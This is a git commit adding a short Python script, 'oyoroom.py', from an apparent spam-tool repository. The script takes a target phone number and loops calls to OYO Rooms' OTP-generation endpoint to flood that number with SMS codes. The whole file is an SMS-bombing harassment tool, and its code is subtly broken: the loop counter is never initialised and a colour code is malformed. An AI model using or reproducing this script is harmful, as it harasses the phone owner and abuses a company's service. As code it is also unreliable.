aa8275c24d7118766ddc1e5038db200e06ca1e3a
The Sixty Nine <52529306+thesixtynine@users.noreply.github.com>
2019-11-14 13:27:35 +0700

    Create oyoroom.py

---
+++ tools/oyoroom.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python
+# Coded by Nedi Senja
+# Github: github.com/theaixtynine/Myspamer
+
+import requests, os
+
+no=input("\033[0m[\033[1;32m+\033[0m] \033[1;77mInput No Target: \033[0m")
+while True:
+        idk=('status')
+        r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
+        if str(idk) in str(r.text):
+                print("\033[0m[\033[1;34#m+\033[0m] \033[1;77mSucces")
+        else:
+                print("\033[0m[\033[1;31m!\033[0m] \033[1;77mFailed")
+                break
+        i+=1
+        if i == 20:
+                print("\033[0m[\033[1;33m-\033[0m] \033[1;77mAs the limited")
+                break
